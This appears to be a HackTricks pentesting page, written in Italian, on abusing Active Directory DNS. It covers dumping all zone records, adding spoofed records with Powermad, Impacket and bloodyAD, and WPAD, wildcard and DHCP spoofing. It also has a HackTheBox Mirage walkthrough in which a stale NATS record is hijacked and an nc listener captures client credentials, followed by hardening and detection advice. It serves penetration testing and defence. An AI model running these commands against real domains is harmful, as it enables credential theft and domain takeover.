# Record DNS di Active Directory

{{#include ../../banners/hacktricks-training.md}}

Per impostazione predefinita, **qualsiasi utente** in Active Directory può **enumerare tutti i record DNS** nelle zone DNS del dominio o della foresta, in modo simile a un trasferimento di zona (gli utenti possono elencare gli oggetti figlio di una zona DNS in un ambiente AD).

Lo strumento [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) consente di **enumerare** ed **esportare** **tutti i record DNS** della zona per attività di ricognizione delle reti interne.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

> adidnsdump v1.4.0 (aprile 2025) aggiunge l'output JSON/Greppable (`--json`), la risoluzione DNS multi-thread e il supporto per TLS 1.2/1.3 durante la connessione a LDAPS

Per ulteriori informazioni, leggi [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Creazione / modifica di record (ADIDNS spoofing)

Poiché il gruppo **Authenticated Users** dispone per impostazione predefinita dell'autorizzazione **Create Child** sulla DACL della zona, qualsiasi account di dominio (o account computer) può registrare record aggiuntivi. Questo può essere utilizzato per dirottare il traffico, forzare NTLM relay o persino compromettere completamente il dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py è incluso in Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitive di attacco comuni

1. **Record wildcard** – `*.<zone>` trasforma il server DNS di AD in un responder valido per l'intera azienda, simile allo spoofing LLMNR/NBNS. Può essere sfruttato per acquisire hash NTLM o inoltrarli a LDAP/SMB. (È necessario disabilitare la ricerca WINS.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – aggiungere `wpad` (o un record **NS** che punti a un host dell'attaccante per aggirare la Global-Query-Block-List) e fare da proxy trasparente alle richieste HTTP in uscita per acquisire credenziali. Microsoft ha corretto i bypass tramite wildcard/DNAME (CVE-2018-8320), ma i **record NS funzionano ancora**.<sup>[[1]](#references)</sup>    
3. **Acquisizione di una voce obsoleta** – rivendicare l'indirizzo IP precedentemente assegnato a una workstation: la voce DNS associata continuerà a risolversi, consentendo attacchi di resource-based constrained delegation o Shadow-Credentials senza interagire affatto con il DNS.    
4. **Spoofing DHCP → DNS** – in una configurazione predefinita di Windows DHCP+DNS, un attaccante non autenticato sulla stessa subnet può sovrascrivere qualsiasi record A esistente (compresi quelli dei Domain Controller) inviando richieste DHCP contraffatte che attivano aggiornamenti DNS dinamici (Akamai “DDSpoof”, 2023). Questo consente un attacco machine-in-the-middle su Kerberos/LDAP e può portare alla compromissione completa del dominio.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – modificare `dNSHostName` di un account macchina sotto il proprio controllo, registrare un record A corrispondente e poi richiedere un certificato per quel nome, così da impersonare il DC. Strumenti come **Certipy** o **BloodyAD** automatizzano completamente il flusso.  

Un record DNS di AD con [informazioni di destinazione serializzate](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) può essere parte di una catena di relay condizionale: il chiamante deve disporre dei diritti per creare record, di un percorso di coercizione che induca il computer di destinazione ad autenticarsi a quel nome e di una destinazione di relay che accetti l'autenticazione risultante. Valutare separatamente il protocollo di destinazione; la firma SMB sulla connessione in ingresso non determina, da sola, se una destinazione HTTPS WinRM accetta il relay. Il livello di patch, la gestione dei nomi, Extended Protection e la configurazione del servizio possono modificare l'esito.

---

### Hijacking di servizi interni tramite record dinamici obsoleti (caso di studio NATS)

Quando gli aggiornamenti dinamici sono consentiti a tutti gli utenti autenticati, **un nome di servizio deregistrato può essere reclamato e fatto puntare a un'infrastruttura dell'attaccante**. Il DC Mirage HTB esponeva l'hostname `nats-svc.mirage.htb` dopo il DNS scavenging, quindi qualsiasi utente con privilegi minimi poteva:<sup>[[3]](#references)</sup>

1. **Verificare che il record non esista** e individuare il SOA con `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Ricreare il record** verso un'interfaccia esterna/VPN che controllano:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersona il servizio in chiaro**. I client NATS si aspettano di vedere un banner INFO { ... } prima di inviare le credenziali, quindi basta copiare un banner legittimo dal broker reale per raccogliere i segreti:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Any client che risolve il nome dirottato invierà immediatamente in leak il proprio frame JSON `CONNECT` (inclusi `"user"`/`"pass"`) al listener. Eseguire il binario ufficiale `nats-server -V` sull’host dell’attaccante, disabilitarne la redazione dei log o semplicemente intercettare la sessione con Wireshark restituisce le stesse credenziali in chiaro, poiché TLS era facoltativo.

4. **Pivot con le credenziali acquisite** – in Mirage, l’account NATS sottratto forniva accesso a JetStream, che esponeva eventi di autenticazione storici contenenti nomi utente/password AD riutilizzabili.

Questo schema si applica a ogni servizio integrato con AD che si affida a handshake TCP non protetti (API HTTP, RPC, MQTT, ecc.): una volta dirottato il record DNS, l’attaccante diventa il servizio.

---

## Rilevamento e hardening

* Nega ad **Authenticated Users** il diritto *Create all child objects* nelle zone sensibili e delega gli aggiornamenti dinamici a un account dedicato usato da DHCP.
* Se gli aggiornamenti dinamici sono necessari, imposta la zona su **Secure-only** e abilita **Name Protection** in DHCP, in modo che solo l’oggetto computer proprietario possa sovrascrivere il proprio record.
* Monitora gli ID evento DNS Server 257/252 (aggiornamento dinamico), 770 (trasferimento di zona) e le scritture LDAP in `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blocca i nomi pericolosi (`wpad`, `isatap`, `*`) con un record intenzionalmente innocuo o tramite la Global Query Block List.
* Mantieni aggiornati i server DNS: ad esempio, le vulnerabilità RCE CVE-2024-26224 e CVE-2024-26231 hanno raggiunto **CVSS 9.8** e sono sfruttabili da remoto contro i Domain Controller.  

## References

- [1] [ADIDNS rivisitato - WPAD, GQBL e altro](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Spoofing dei record DNS sfruttando gli aggiornamenti dinamici DNS di DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: concatenare leak NFS, abuso di Dynamic DNS, furto di credenziali NATS, segreti JetStream e Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrare nella zona: scaricare il DNS di Active Directory con adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
